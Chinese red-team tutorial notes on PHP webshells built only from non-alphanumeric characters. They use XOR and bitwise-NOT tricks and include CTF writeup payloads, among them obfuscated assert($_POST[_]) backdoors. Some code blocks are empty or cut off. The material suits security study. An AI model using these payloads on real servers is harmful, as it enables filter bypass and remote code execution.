# 无字母数字Webshell
---
**相关文章 & Source & Reference**
- [记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)](https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html)
- [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
- [无字母数字Webshell之提高篇](https://www.freebuf.com/articles/web/186298.html)
- [浅析CTF绕过字符数字构造shell](https://mp.weixin.qq.com/s/mxwoodKUiXdbOSgPUkKaWg)
---
## 异或绕过
```php
```
之所以会得到这样的结果，是因为代码中对字符 "A" 和字符 "?" 进行了异或操作。在 PHP 中，两个变量进行异或时，先会将字符串转换成 ASCII 值，再将 ASCII 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 ASCII 值，再将 ASCII 值转换成字符串。异或操作有时也被用来交换两个变量的值。
比如像上面这个例子
A 的 ASCII 值是 65，对应的二进制值是 01000001
? 的 ASCII 值是 63，对应的二进制值是 00111111
异或的二进制的值是 01111110，对应的 ASCII 值是 126，对应的字符串的值就是~ 了
**案例**
PHP 是弱类型的语言，也就是说在 PHP 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 PHP 弱类型的这个特点，我们对 PHP 的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：
```php
```
上面的代码运行将输出 "test"
`$_++;` 这行代码的意思是对变量名为 `_` 的变量进行自增操作，在 PHP 中未定义的变量默认值为 null,`null==false==0`, 我们可以在不使用任何数字的情况下, 通过对未定义变量的自增操作来得到一个数字。
`$__="?" ^ "}";` 对字符 `?` 和 `}` 进行异或运算，得到结果 B 赋给变量名为 `__`(两个下划线) 的变量
`$__();` 通过上面的赋值操作，变量 `$__` 的值为 B，所以这行可以看作是 B(), 在 PHP 中, 这行代码表示调用函数 B, 所以执行结果为 test。在 PHP 中，我们可以将字符串当作函数来处理。
有了这个例子，我们就可以使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如_POST","system","call_user_func_array"，或者是任何我们需要的东西。
```php
//.=是字符串的连接
//POST /?0=assert
//1=echo phpinfo();
```
甚至可以将上面的代码合并为一行，从而使程序的可读性更差
```php
$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
```
---
## 取反绕过
取反的符号是~，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。
直接看构造 phpinfo()
```php
(~%8F%97%8F%96%91%99%90)();
```
**构造 assert 字符**
```
%9E^%FF=>a
%8C^%FF=>s
%9A^%FF=>e
%8D^%FF=>r
%8B^%FF=>t
%A0^%FF=>_
%AF^%FF=>P
%B0^%FF=>O
%AC^%FF=>S
%AB^%FF=>T
$_="%9E%8C%8C%9A%8D%8B"^"%FF%FF%FF%FF%FF%FF";
$__="%A0%AF%B0%AC%AB"^"%FF%FF%FF%FF%FF";
$___=$$__;
$_($___[_]);
```
---
## 例题1
```php
40){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
```
绕过 A-Za-z0-9 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符
并且字符串长度小于 40
然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，这里我们是 "getFlag"，然后执行
```php
$code=~"getFlag";
echo urlencode($code); //得到处理过的值
```
最终 writeup
```php
?code=$_=~%98%9A%8B%B9%93%9E%98;$_();
// 把getFlag取反然后URL编码
?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=getFlag
?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&%aa=getFlag
?code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();
```
**PHP7 的思路**
PHP7 前是不允许用 ($a)(); 这样的方法来执行动态函数的，但 PHP7 中增加了对此的支持。所以，我们可以通过 ('phpinfo')(); 来执行函数，第一个括号中可以是任意 PHP 表达式。
所以很简单了，构造一个可以生成 phpinfo 这个字符串的 PHP 表达式即可。payload 如下（不可见字符用 url 编码表示）：
```
(~%8F%97%8F%96%91%99%90)();
```
```php
?code=(~%8F%97%8F%96%91%99%90)();
```
![](../../../../../assets/img/Security/RedTeam/语言安全/PHP安全/无字母数字Webshell/6.png)
---
## 例题2
```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}
```
将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，如 “assert”，然后动态执行之即可。
那么，变换方法 将是解决本题的要点。
不过在此之前，我需要说说 php5 和 7 的差异。
php5 中 assert 是一个函数，我们可以通过 $f='assert';$f(...); 这样的方法来动态执行任意代码。
但 php7 中，assert 不再是函数，变成了一个语言结构（类似 eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用 file_put_contents 函数，同样可以用来 getshell。
**思路1**
通过异或执行命令
```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```
```
POST /?shell=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
Content-Type: application/x-www-form-urlencoded
_=phpinfo();
```